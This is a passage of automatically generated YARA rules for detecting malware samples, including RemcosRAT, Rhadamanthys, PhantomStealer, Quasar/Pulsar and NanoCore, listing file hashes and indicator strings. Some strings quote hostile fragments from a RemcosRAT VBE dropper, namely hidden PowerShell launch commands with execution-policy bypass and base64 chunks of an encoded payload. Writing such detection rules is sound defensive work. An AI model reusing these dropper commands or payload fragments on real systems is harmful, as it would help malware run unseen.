      $x1 = "costura.system.collections.immutable.dll.compressed|7.0.0.0|System.Collections.Immutable, Version=7.0.0.0, Culture=neutral, Publ" ascii /* score: '44.00'*/
      $x2 = "costura.pulsar.common.dll.compressed|1.6.6.0|Pulsar.Common, Version=1.6.6.0, Culture=neutral, PublicKeyToken=null|Pulsar.Common." ascii /* score: '41.00'*/
      $x3 = "costura.pulsar.common.dll.compressed|1.6.6.0|Pulsar.Common, Version=1.6.6.0, Culture=neutral, PublicKeyToken=null|Pulsar.Common." ascii /* score: '39.00'*/
      $x4 = "costura.protobuf-net.core.dll.compressed|3.0.0.0|protobuf-net.Core, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2" ascii /* score: '39.00'*/
      $x5 = "costura.protobuf-net.dll.compressed|3.0.0.0|protobuf-net, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67|prot" ascii /* score: '39.00'*/
      $x6 = "costura.protobuf-net.core.dll.compressed|3.0.0.0|protobuf-net.Core, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2" ascii /* score: '37.00'*/
      $x7 = "costura.protobuf-net.dll.compressed|3.0.0.0|protobuf-net, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67|prot" ascii /* score: '37.00'*/
      $x8 = "costura.system.collections.immutable.dll.compressed|7.0.0.0|System.Collections.Immutable, Version=7.0.0.0, Culture=neutral, Publ" ascii /* score: '33.00'*/
      $s9 = "icKeyToken=b03f5f7f11d50a3a|System.Collections.Immutable.dll|2F1EBB67E21B33C74C4C6CF217AC1F797959F18B|198784" fullword ascii /* score: '27.00'*/
      $s10 = "costura.protobuf-net.core.dll.compressed" fullword ascii /* score: '22.00'*/
      $s11 = "costura.protobuf-net.dll.compressed" fullword ascii /* score: '22.00'*/
      $s12 = "Pulsar.Common.Messages.FunStuff.GDI" fullword ascii /* score: '17.00'*/
      $s13 = "e4d67|protobuf-net.Core.dll|D60DAF9ACAACBEB3DEF349C76F236DF1460A4797|289792" fullword ascii /* score: '14.00'*/
      $s14 = "obuf-net.dll|A6FF2228E8114A2B4040D0CA137C4B544FF034F4|277504" fullword ascii /* score: '14.00'*/
      $s15 = "float4 main(float4 position : SV_POSITION, float2 texCoord : TEXCOORD) : SV_Target" fullword wide /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__93a138801d9601e4c36e6274c8b9d111_imphash__Rhadamanthys_signature__d42595b695fc008ef2c56aabd8efd68e__29 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash2 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $x1 = "<msiOptions> - options for msiexec.exe on running the MSI package" fullword wide /* score: '32.00'*/
      $s2 = "#- launches the EXE setup without UI&- launches the EXE setup with basic UI'- list languages supported by the setup?<lang_id> - " wide /* score: '26.00'*/
      $s3 = "Setup package was encrypted using AES 256 algorithm. To continue the setup process, you should provide the password needed to de" wide /* score: '25.00'*/
      $s4 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxForegroundDisabled}}\" />" fullword ascii /* score: '23.00'*/
      $s5 = "                <!-- <PointerUpThemeAnimation Storyboard.TargetName=\"ContentPresenter\"/>-->" fullword ascii /* score: '23.00'*/
      $s6 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxForegroundFocused}}\" />" fullword ascii /* score: '23.00'*/
      $s7 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxPlaceHolderForegroundFocusedPressed}}\" />" fullword ascii /* score: '23.00'*/
      $s8 = "<ObjectAnimationUsingKeyFrames Storyboard.TargetName=\"ContentPresenter\" Storyboard.TargetProperty=\"BorderThickness\">" fullword ascii /* score: '22.00'*/
      $s9 = "SurfsharkSetup.exe" fullword wide /* score: '22.00'*/
      $s10 = "                        <DiscreteObjectKeyFrame KeyTime=\"0\" Value=\"{Binding PlaceholderForeground, RelativeSource={RelativeSo" ascii /* score: '21.00'*/
      $s11 = "                      <Setter Target=\"PlaceholderTextContentPresenter.Foreground\" Value=\"{Binding PlaceholderForeground, Rela" ascii /* score: '21.00'*/
      $s12 = "                      <Setter Target=\"PlaceholderTextContentPresenter.Foreground\" Value=\"{Binding PlaceholderForeground, Rela" ascii /* score: '21.00'*/
      $s13 = "                        <DiscreteObjectKeyFrame KeyTime=\"0\" Value=\"{Binding PlaceholderForeground, RelativeSource={RelativeSo" ascii /* score: '21.00'*/
      $s14 = "<ControlTemplate xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"" fullword ascii /* score: '21.00'*/
      $s15 = "                                        <!-- <ObjectAnimationUsingKeyFrames Storyboard.TargetName=\"ContentElement\" Storyboard." ascii /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__2860c07ce5081b22825e56e478535f3f_imphash__RemcosRAT_signature__4071b54e_RemcosRAT_signature__42df8cdda_30 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_2860c07ce5081b22825e56e478535f3f(imphash).exe, RemcosRAT(signature)_4071b54e.rar, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash).exe, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash)_0ab54711.exe, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash)_2c3f61a3.exe, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash)_73a4bad7.exe, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash)_7f8da38b.exe, RemcosRAT(signature)_4655ec6ed5cb9f9a31a6e5ade53778ef(imphash).exe, RemcosRAT(signature)_63a7884deadb0f34accabcb21cf8585a(imphash).exe, RemcosRAT(signature)_7c3bfd934324442b55f2b4da4e9ce2bb(imphash).exe, RemcosRAT(signature)_dd5ab8b9fa764d7d2af9d7651496ee43(imphash).exe, RemcosRAT(signature)_dd5ab8b9fa764d7d2af9d7651496ee43(imphash)_3f4faa7f.exe, RemcosRAT(signature)_f6d52fbb.cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2ea46bc205756cca8f9db168d2b8fccc1b8c6b8463a9bf6a69ef805f8cb34d18"
      hash2 = "4071b54ea9759809841f376c273e03ec19f1c7231651d7290609362c7eb637d3"
      hash3 = "06e327fa0521a43fec30b1759ab46b18245467a015bb9fd2c084858f079b56f5"
      hash4 = "0ab54711aadfac105a9bdde817fef4dc756121aab43ffacf507349d2928aab2f"
      hash5 = "2c3f61a35d0fdbc271f297e0e6e2cd441e3f1b0025948a6715860d1465da601c"
      hash6 = "73a4bad784378c8ed38f2831eb93631ab1d778682665a34efee5a02d99a4a075"
      hash7 = "7f8da38b7a8f562bd0449133fd3cf007fd008d186c1bb99b9795a00145da8537"
      hash8 = "03b1224506d186abf54580aec4c3ae7e774c83630e5aa2c9811b31748633380f"
      hash9 = "8c548a602595e9ef03eeab8257d07581a7a6824e40a121f22d6a1d780621936b"
      hash10 = "9dabf7a759fbaeb0a6ae899d52534b67f302546a72f82d4e3639e777c6141706"
      hash11 = "5a94af11fb9313d24532099bf575e5b9ab10d87be64343dfd123a2badedc117b"
      hash12 = "3f4faa7fd9d13b6ba31874cd9e9720f99b8639b0b7d5017fea15ec3d0da6c7e6"
      hash13 = "f6d52fbbf7ab8c79d6491ca1a41d5666d67a713a2e03f9dd2f87212594a63e7c"
   strings:
      $s1 = "clWebDarkMagenta" fullword ascii /* score: '14.00'*/
      $s2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii /* score: '12.00'*/
      $s3 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii /* score: '11.00'*/
      $s4 = "evalcomp" fullword ascii /* score: '11.00'*/
      $s5 = "clWebDarkKhaki" fullword ascii /* score: '9.00'*/
      $s6 = "clWebGhostWhite" fullword ascii /* score: '9.00'*/
      $s7 = "KernelBASE" fullword ascii /* score: '9.00'*/
      $s8 = "clWebDarkTurquoise" fullword ascii /* score: '9.00'*/
      $s9 = "clWebDarkgreen" fullword ascii /* score: '9.00'*/
      $s10 = "clWebDarkOliveGreen" fullword ascii /* score: '9.00'*/
      $s11 = "clWebDarkOrchid" fullword ascii /* score: '9.00'*/
      $s12 = "clWebDarkGoldenRod" fullword ascii /* score: '9.00'*/
      $s13 = "clWebDarkGray" fullword ascii /* score: '9.00'*/
      $s14 = "clWebDarkOrange" fullword ascii /* score: '9.00'*/
      $s15 = "clWebDarkSlateBlue" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x6152 or uint16(0) == 0x534d ) and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__54b647e7a2c96cc7cae60be08f1c6ee2_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_31 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_54b647e7a2c96cc7cae60be08f1c6ee2(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe, RemcosRAT(signature)_75d4ca449a8e870d1b606db10dd417d9(imphash).exe, RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f232d497e23b33067266e2c9fb03f9ad66df46102b374a20d28c4200e227dbe9"
      hash2 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash3 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
      hash4 = "6bd383fd777d39b1b6b0377430425c7f6e5b63070376ca69fe4d56f69b4395e5"
      hash5 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash6 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash7 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash8 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash9 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash10 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash11 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $x1 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x2 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $x3 = "System.Linq.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '31.00'*/
      $s4 = "4System.Private.CoreLib.dll" fullword ascii /* score: '29.00'*/
      $s5 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s6 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s8 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s10 = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '21.00'*/
      $s11 = ".SplitWithPostProcessing@" fullword ascii /* score: '20.00'*/
      $s12 = "4SplitWithoutPostProcessing@" fullword ascii /* score: '20.00'*/
      $s13 = "6GetCurrentProcessorNumberEx" fullword ascii /* score: '20.00'*/
      $s14 = "System.Collections.Generic.IEnumerable<System.Collections.Generic.KeyValuePair<TKey,TValue>>.GetEnumerator@" fullword ascii /* score: '18.00'*/
      $s15 = "0TargetFrameworkAttribute" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _NanoCore_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7385a412_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a74_32 {
   meta:
      description = "_subset_batch - from files NanoCore(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7385a412.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8e4c4435.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7385a41293c829759b6e0e60fa1f0e5b9bc53270861bb8a7954fbbfc5353281a"
      hash2 = "8e4c4435a5262a614a2fd4297f44933de12628e958311a99c8befb3165663e60"
   strings:
      $s1 = "Intasuranfe.exe" fullword wide /* score: '22.00'*/
      $s2 = "PENDIENTE" fullword wide /* base64 encoded string '<CC CS' */ /* score: '16.50'*/
      $s3 = "SELECT test.TES_ID, CASE when TES_TIPO = 'Examen' then  ('** ' + TES_NOMBRE + ' **') when TES_TIPO = 'Parametro' then  ('  --> '" wide /* score: '16.00'*/
      $s4 = "select test.TES_ID, CASE when TES_TIPO = 'Examen' then  ('** ' + TES_NOMBRE + ' **') when TES_TIPO = 'Parametro' then  ('  --> '" wide /* score: '13.00'*/
      $s5 = "delete from i_temp_stock;" fullword wide /* score: '11.00'*/
      $s6 = "Insert into i_temp_stock values ('" fullword wide /* score: '11.00'*/
      $s7 = "select * from tipo_autocompletar where auto_nombre = '" fullword wide /* score: '11.00'*/
      $s8 = "AUTOCOMPLETE" fullword wide /* score: '9.50'*/
      $s9 = "COMENTARIO" fullword wide /* score: '9.50'*/
      $s10 = "REPORTADO" fullword wide /* score: '9.50'*/
      $s11 = "TabConTrat" fullword wide /* score: '9.00'*/
      $s12 = "No se pudo realizar la operaci" fullword wide /* score: '9.00'*/
      $s13 = "n solicitada, Operaci" fullword wide /* score: '9.00'*/
      $s14 = "No se pudo realizar la operacion solicitada, Guardar test Asistente" fullword wide /* score: '9.00'*/
      $s15 = "No se pudo realizar la operacion solicitada, Guardar palabra" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__54b647e7a2c96cc7cae60be08f1c6ee2_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_33 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_54b647e7a2c96cc7cae60be08f1c6ee2(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe, RemcosRAT(signature)_75d4ca449a8e870d1b606db10dd417d9(imphash).exe, RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f232d497e23b33067266e2c9fb03f9ad66df46102b374a20d28c4200e227dbe9"
      hash2 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash3 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
      hash4 = "6bd383fd777d39b1b6b0377430425c7f6e5b63070376ca69fe4d56f69b4395e5"
      hash5 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash6 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash7 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash8 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash9 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash10 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $s1 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s2 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
      $s3 = "The specified TaskContinuationOptions combined LongRunning and ExecuteSynchronously.  Synchronous continuations should not be lo" wide /* score: '21.00'*/
      $s4 = "Microsoft.Extensions.DependencyInjection.VerifyOpenGenericServiceTrimmability" fullword ascii /* score: '20.00'*/
      $s5 = "System.Runtime.CompilerServices.RuntimeFeature.IsDynamicCodeSupported" fullword ascii /* score: '20.00'*/
      $s6 = "Attempted to perform an unauthorized operation" fullword wide /* score: '19.00'*/
      $s7 = "Collection was modified; enumeration operation may not execute" fullword wide /* score: '19.00'*/
      $s8 = "System.Runtime.InteropServices.EnableConsumingManagedCodeFromNativeHosting" fullword ascii /* score: '18.00'*/
      $s9 = "System.Runtime.InteropServices.EnableCppCLIHostActivation" fullword ascii /* score: '18.00'*/
      $s10 = "GetHashCode() on Span and ReadOnlySpan is not supported" fullword wide /* score: '18.00'*/
      $s11 = "The output char buffer is too small to contain the decoded characters, encoding codepage '{0}' and fallback '{1}'" fullword wide /* score: '18.00'*/
      $s12 = "The wait completed due to an abandoned mutex" fullword wide /* score: '18.00'*/
      $s13 = "System.ComponentModel.TypeConverter.EnableUnsafeBinaryFormatterInDesigntimeLicenseContextSerialization" fullword ascii /* score: '17.00'*/
      $s14 = "System.Runtime.InteropServices.BuiltInComInterop.IsSupported" fullword ascii /* score: '16.00'*/
      $s15 = "System.Runtime.InteropServices.Marshalling.EnableGeneratedComInterfaceComImportInterop" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__4ee81d80_RemcosRAT_signature__6b3d74ac_34 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_4ee81d80.vbe, RemcosRAT(signature)_6b3d74ac.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4ee81d80fca2aaeafd2bb96208198c0d8ee243d856f6e7ab40d53bae4f0fde75"
      hash2 = "6b3d74ac780629803d6b15cc04981e1252c7fae894862e4340fbd138f418d828"
   strings:
      $x1 = "        startupCmd = \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"\" & startupPsFile & \"\"\"\"" fullword ascii /* score: '38.00'*/
      $x2 = "        psCmd = \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"\" & psFile & \"\"\"\"" fullword ascii /* score: '38.00'*/
      $s3 = "BQXdnSUlGTjVjM1JsYlM1SGJHOWlZV3hwZW1GMGFXOXVMbE52Y25SV1pYSnphVzl1Q1FVQUFBQUFBQUFBZndBQUFBb0VBd0FBQUIxVGVYTjBaVzB1UjJ4dlltRnNhWHB" ascii /* base64 encoded string 'AwgIIFN5c3RlbS5HbG9iYWxpemF0aW9uLlNvcnRWZXJzaW9uCQUAAAAAAAAAfwAAAAoEAwAAAB1TeXN0ZW0uR2xvYmFsaXp' */ /* score: '26.00'*/
      $s4 = "wY21saWRYUmxjd0VBQUFBSGRtRnNkV1ZmWHdBSUFnQUFBQUJnQUFBTEFnQkNBQUVBQUFELy8vLy9BUUFBQUFBQUFBQUVBUUFBQUNCVGVYTjBaVzB1UjJ4dlltRnNhWHB" ascii /* base64 encoded string 'cmlidXRlcwEAAAAHdmFsdWVfXwAIAgAAAABgAAALAgBCAAEAAAD/////AQAAAAAAAAAEAQAAACBTeXN0ZW0uR2xvYmFsaXp' */ /* score: '26.00'*/
      $s5 = "BQUFEQUxuSnpjbU1BQUFCMEF3QUFBS0FBQUFBRUFBQUFXQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFRQzV5Wld4dll3QUFEQUFBQUFEQUFBQUFBZ0FBQUZ3QUFBQUFBQUF" ascii /* base64 encoded string 'AADALnJzcmMAAAB0AwAAAKAAAAAEAAAAWAAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAADAAAAAAgAAAFwAAAAAAAA' */ /* score: '26.00'*/
      $s6 = "BUkdWc1pXZGhkR1VBVTBoUFQxUUFjR0YwYUFCQ2VYUmxBSEJoZVd4dllXUUFTVzUwTVRZQVUybDZaVTltQUVWdGNIUjVBRnBsY204QVJYaGpaWEIwYVc5dUFFSnBkRU5" ascii /* base64 encoded string 'RGVsZWdhdGUAU0hPT1QAcGF0aABCeXRlAHBheWxvYWQASW50MTYAU2l6ZU9mAEVtcHR5AFplcm8ARXhjZXB0aW9uAEJpdEN' */ /* score: '26.00'*/
      $s7 = "runner.Execute" fullword ascii /* score: '25.00'*/
      $s8 = "GMkEyODI5RkYyQTI3MjhGRjJBMjYyN0ZGMkEyNjI4RkYyQTI2MjlGRjJEMjkyQ0ZGMzEyRTMwRkYzNTMzMzRGRjMxMkUzMEZGMzUzMzM0RkY0MDNEM0ZGRjQxM0Y0MEZ" ascii /* base64 encoded string '2A2829FF2A2728FF2A2627FF2A2628FF2A2629FF2D292CFF312E30FF353334FF312E30FF353334FF403D3FFF413F40F' */ /* score: '24.00'*/
      $s9 = "wMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDgwRkZGRkZGRkZCMTE5QkY0NDRFRTY0MEJCMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDA" ascii /* base64 encoded string '000000000000000000000000000000000000000000000080FFFFFFFFB119BF444EE640BB01000000000000000000000' */ /* score: '24.00'*/
      $s10 = "VYVhSc1pVRjBkSEpwWW5WMFpRQlRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJnQlRkSEpwYm1jQVFYTnpaVzFpYkhsRVpYTmpjbWx3ZEdsdmJrRjBkSEpwWW5WMFpRQkJjM05" ascii /* base64 encoded string 'aXRsZUF0dHJpYnV0ZQBTeXN0ZW0uUmVmbGVjdGlvbgBTdHJpbmcAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBBc3N' */ /* score: '24.00'*/
      $s11 = "0WlhSb2IyUXdlRFl3TURBd01qQXRNUUFrSkcxbGRHaHZaREI0TmpBd01EQXlNQzB5QUNRa2JXVjBhRzlrTUhnMk1EQXdNREpoTFRFQUpDUnRaWFJvYjJRd2VEWXdNREF" ascii /* base64 encoded string 'ZXRob2QweDYwMDAwMjAtMQAkJG1ldGhvZDB4NjAwMDAyMC0yACQkbWV0aG9kMHg2MDAwMDJhLTEAJCRtZXRob2QweDYwMDA' */ /* score: '24.00'*/
      $s12 = "GMTc4QzJGRkYxMzdEMjhGRjAwMDkwMEZGMDAwMDAwRkY2NjY2NjZGRkVBODQwMEZGMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBGRjk5MDBGRjJBMkEyQUZ" ascii /* base64 encoded string '178C2FFF137D28FF000900FF000000FF666666FFEA8400FF00000000000000000000000000000000FF9900FF2A2A2AF' */ /* score: '24.00'*/
      $s13 = "sY2l3Z2JYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU" ascii /* base64 encoded string 'ciwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE' */ /* score: '24.00'*/
      $s14 = "CMDNDQ0NDQ0M4QkM2ODNFMDBGODVDMDBGODVFMzAwMDAwMDhCRDE4M0UxN0ZDMUVBMDc3NDY2OERBNDI0MDAwMDAwMDA4QkZGNjYwRjZGMDY2NjBGNkY0RTEwNjYwRjZ" ascii /* base64 encoded string '03CCCCCC8BC683E00F85C00F85E30000008BD183E17FC1EA0774668DA424000000008BFF660F6F06660F6F4E10660F6' */ /* score: '24.00'*/
      $s15 = "1MTJCOTBCMDEwMDAwNjYzOTQ4MTg3NTA3QjgwMTAwMDAwMDVEQzMzM0MwNURDM0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDNTY4QjQ0MjQxNDBCQzA3NTI4OEI0QzI" ascii /* base64 encoded string '12B90B010000663948187507B8010000005DC333C05DC3CCCCCCCCCCCCCCCCCCCCCCCCCC568B4424140BC075288B4C2' */ /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x704f and filesize < 4000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__2860c07ce5081b22825e56e478535f3f_imphash__RemcosRAT_signature__4071b54e_RemcosRAT_signature__42df8cdda_35 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_2860c07ce5081b22825e56e478535f3f(imphash).exe, RemcosRAT(signature)_4071b54e.rar, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash).exe, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash)_0ab54711.exe, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash)_2c3f61a3.exe, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash)_73a4bad7.exe, RemcosRAT(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash)_7f8da38b.exe, RemcosRAT(signature)_4655ec6ed5cb9f9a31a6e5ade53778ef(imphash).exe, RemcosRAT(signature)_63a7884deadb0f34accabcb21cf8585a(imphash).exe, RemcosRAT(signature)_f6d52fbb.cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2ea46bc205756cca8f9db168d2b8fccc1b8c6b8463a9bf6a69ef805f8cb34d18"
      hash2 = "4071b54ea9759809841f376c273e03ec19f1c7231651d7290609362c7eb637d3"
      hash3 = "06e327fa0521a43fec30b1759ab46b18245467a015bb9fd2c084858f079b56f5"
      hash4 = "0ab54711aadfac105a9bdde817fef4dc756121aab43ffacf507349d2928aab2f"
      hash5 = "2c3f61a35d0fdbc271f297e0e6e2cd441e3f1b0025948a6715860d1465da601c"
      hash6 = "73a4bad784378c8ed38f2831eb93631ab1d778682665a34efee5a02d99a4a075"
      hash7 = "7f8da38b7a8f562bd0449133fd3cf007fd008d186c1bb99b9795a00145da8537"
      hash8 = "03b1224506d186abf54580aec4c3ae7e774c83630e5aa2c9811b31748633380f"
      hash9 = "8c548a602595e9ef03eeab8257d07581a7a6824e40a121f22d6a1d780621936b"
      hash10 = "f6d52fbbf7ab8c79d6491ca1a41d5666d67a713a2e03f9dd2f87212594a63e7c"
   strings:
      $s1 = ";|;x;t;p;l;h;d;`;\\;X;T;P;L;H;D;@;<;8;4;08" fullword ascii /* reversed goodware string '80;4;8;<;@;D;H;L;P;T;X;\\;`;d;h;l;p;t;x;|;' */ /* score: '11.00'*/
      $s2 = "=s=n=a=\\=O=J===8=+=&=" fullword ascii /* reversed goodware string '=&=+=8===J=O=\\=a=n=s=' */ /* score: '11.00'*/
      $s3 = ">k>d>E>" fullword ascii /* reversed goodware string '>E>d>k>' */ /* score: '11.00'*/
      $s4 = ":R:K:F:" fullword ascii /* reversed goodware string ':F:K:R:' */ /* score: '11.00'*/
      $s5 = "<m<:<-< <" fullword ascii /* reversed goodware string '< <-<:<m<' */ /* score: '11.00'*/
      $s6 = ";J;C;>;" fullword ascii /* reversed goodware string ';>;C;J;' */ /* score: '11.00'*/
      $s7 = ";e;X;#;" fullword ascii /* reversed goodware string ';#;X;e;' */ /* score: '11.00'*/
      $s8 = "9<9894909,9(9$9 9" fullword ascii /* reversed goodware string '9 9$9(9,9094989<9' */ /* score: '11.00'*/
